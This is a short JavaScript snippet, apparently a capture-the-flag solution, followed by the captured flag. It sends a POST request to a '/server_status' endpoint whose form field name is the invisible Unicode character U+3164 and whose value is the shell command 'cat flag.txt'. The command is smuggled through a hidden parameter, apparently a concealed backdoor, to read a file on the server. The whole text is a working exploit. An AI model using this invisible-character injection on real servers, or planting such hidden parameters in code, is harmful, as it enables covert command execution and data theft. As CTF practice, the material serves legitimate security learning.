const key = encodeURIComponent('\u3164'); // "ㅤ"
fetch('/server_status', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: `choice=6&${key}=${encodeURIComponent('cat flag.txt')}`
}).then(r=>r.text()).then(console.log);

// Console ruuga sha
// Flag : HZ2024{1nvi5IBl3_cH4r4cT3rS_n0t_sO_v1SIbL3_94b549e9c3c5d560}